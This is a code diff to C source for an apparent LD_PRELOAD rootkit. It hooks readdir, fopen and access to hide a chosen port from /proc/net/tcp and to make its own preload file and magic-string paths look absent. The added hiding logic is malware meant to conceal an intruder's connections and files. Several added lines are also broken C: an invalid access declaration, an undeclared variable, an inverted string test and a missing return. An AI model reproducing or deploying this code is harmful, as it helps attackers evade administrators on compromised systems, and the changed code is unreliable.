@@ -4,6 +4,7 @@
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <sys/stat.h>
+#include <sys/wait.h>
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <dlfcn.h>
@@ -18,6 +19,7 @@ static struct dirent* (*old_readdir)(DIR *dir) = NULL;
 static struct dirent64* (*old_readdir64)(DIR *dir) = NULL;
 static FILE* (*old_fopen)(const char *path, const char *mode) = NULL;
 static FILE* (*old_fopen64)(const char *path, const char *mode) = NULL;
+static int access(const char *path, int mode) = NULL;
 static int (*old_open)(const char *path, int flags, mode_t mode) = NULL;
 static int (*old_openat)(int fd, const char *pathname, int flags, mode_t mode) = NULL;
 static int (*old_rmdir)(const char *path) = NULL;
@@ -58,6 +60,30 @@ void IPv4() {
 }
 
 
+void hijack_proc_net_tcp(FILE* tmp, const char *path, const char* mode) {
+    FILE *old_file;
+    char *buff = NULL;
+    size_t buff_length = 0;
+
+    #if __x86_64__
+    old_file = old_fopen64(path, mode);
+    #else
+    old_file = old_fopen(path, mode);
+    #endif
+
+    if(old_file != NULL) {
+        while(getline(&buff, &buff_length, old_file) != -1) { 
+            if(strstr(buff, HEX_PORT) == NULL)
+                fputs(buff, tmp);
+        }
+        fclose(old_file);
+        free(buff);
+        buff = NULL;
+        rewind(tmp);
+    }
+}
+
+
 struct dirent* readdir(DIR *dir) {
     struct dirent *dir_;
 
@@ -85,25 +111,11 @@ FILE* fopen(const char *path, const char *mode) {
 
     if(old_fopen == NULL) old_fopen = dlsym(RTLD_NEXT, "fopen64");
     if(strcmp(path, PROC_NET_TCP) == 0 || strcmp(path, PROC_NET_TCP6) == 0) {
-        FILE *tmp = tmpfile(), *old_file;
-        char *buff = NULL;
-        size_t buff_length = 0;
-
-        if((old_file = old_fopen(path, mode)) != NULL) {
-            while(getline(&buff, &buff_length, old_file) != -1) {
-                if(strstr(buff, KEY_PORT) == NULL)
-                    fputs(buff, tmp);
-            }
-            fclose(old_file);
-            free(buff);
-            buff = NULL;
-            rewind(tmp);
-
-            return tmp;
-        }
-        if(tmp != NULL) fclose(tmp);
+        FILE *tmp = tmpfile();
+        
+        hijack_proc_net_tcp(tmp, path, mode);    
+        return tmp;
     }
-
     if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
     memset(&tmp_stat, 0, sizeof(stat));
     old_xstat(3, path, &tmp_stat);
@@ -123,25 +135,11 @@ FILE* fopen64(const char *path, const char *mode) {
 
     if(old_fopen64 == NULL) old_fopen64 = dlsym(RTLD_NEXT, "fopen64");
     if(strcmp(path, PROC_NET_TCP) == 0 || strcmp(path, PROC_NET_TCP6) == 0) {
-        FILE *tmp = tmpfile64(), *old_file;
-        char *buff = NULL;
-        size_t buff_length = 0;
+        FILE *tmp = tmpfile64();
 
-        if((old_file = old_fopen64(path, mode)) != NULL) {
-            while(getline(&buff, &buff_length, old_file) != -1) { 
-                if(strstr(buff, KEY_PORT) == NULL)
-                    fputs(buff, tmp);
-            }
-            fclose(old_file);
-            free(buff);
-            buff = NULL;
-            rewind(tmp);
-
-            return tmp;
-        }
-        if(tmp != NULL) fclose(tmp);
+        hijack_proc_net_tcp(tmp, path, mode);
+        return tmp;
     }
-
     if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
     memset(&tmp_stat, 0, sizeof(stat64));
     old_xstat64(3, path, &tmp_stat);
@@ -153,6 +151,15 @@ FILE* fopen64(const char *path, const char *mode) {
         return NULL;
     }
     return old_fopen64(path, mode);
+}
+
+
+int access(const char *path, int mode) {
+    if(old_access == NULL) old_access = dlsym(RTLD_NEXT, "access");
+    if(strcmp(path, PRELOAD_PATH) || strstr(path, MAGIC_STRING)) {
+        errno = ENOENT;
+        return -1;
+    }
 }
 
 
